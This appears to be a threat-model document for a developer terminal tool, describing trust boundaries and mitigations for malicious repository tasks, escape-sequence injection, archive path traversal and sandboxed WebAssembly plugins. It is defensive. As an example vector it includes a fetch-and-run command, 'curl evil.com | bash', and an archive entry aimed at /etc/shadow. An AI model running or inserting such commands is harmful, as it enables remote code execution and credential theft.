# Security Boundaries & Threat Modeling

TermExplorer operates as a developer workstation interacting with untrusted project repositories, external CLI utilities, and third-party WebAssembly plugins. This document defines the security architecture and threat models.

---

## 1. Security Domain Matrix

| Security Domain | Trust Level | Enforced Boundaries |
|---|:---:|---|
| **Core Rust Application** | Fully Trusted | Memory safe; compiled with standard Rust safety guarantees |
| **User Configuration** | Semi-Trusted | Validated & clamped; malformed data archived without execution |
| **Workspace Repository Content** | Untrusted | Default-deny Task Runner; escape sequence sanitization |
| **WebAssembly Plugins** | Untrusted | `wasmi` sandbox; 16 MiB memory ceiling; 5M fuel limit; default-deny capabilities |
| **External CLI Helpers** | Semi-Trusted | Arguments passed as vectors (`Command::args`), avoiding shell injection |
| **Embedded Shell PTY** | User Privilege | Runs with current user permissions inside standard POSIX PTY session |

---

## 2. Threat Mitigation Strategies

### Threat 1: Malicious Repository Tasks
- **Vector**: An untrusted cloned repository contains `.termexplorer/tasks.toml` with malicious commands (e.g. `curl evil.com | bash`).
- **Mitigation**: **Workspace Trust**. TermExplorer detects untrusted directories and refuses to execute tasks until the user explicitly approves the workspace. Trust approvals are pinned to the workspace path and recorded in `trusted_workspaces.json`.

### Threat 2: Terminal Escape Sequence Injection
- **Vector**: Inspecting a file containing ANSI escape sequences designed to exploit terminal emulator vulnerabilities (e.g. device status reporting or title bar commands).
- **Mitigation**: All preview text lines are filtered through `sanitize_preview_line()`, which strips raw control characters (ASCII 0–31 except `\n` and `\t`) and disables dangerous OSC sequences.

### Threat 3: Archive Path Traversal (Zip Slip)
- **Vector**: Opening an archive containing entries like `../../../../etc/shadow`.
- **Mitigation**: The archive previewer evaluates relative paths and rejects any entry attempting directory traversal beyond the target directory root.

### Threat 4: Rogue WebAssembly Plugin Execution
- **Vector**: A plugin contains an infinite loop, attempts to exhaust host memory, or tries to read arbitrary files.
- **Mitigation**:
  1. `wasmi` execution is metered with 5M fuel units per invocation.
  2. Memory is hard-limited to 16 MiB.
  3. Default-deny permission checks on all host API calls (`host_get_workspace`, `host_get_active_file`).
  4. Plugins cannot initiate network connections or execute host shell commands.
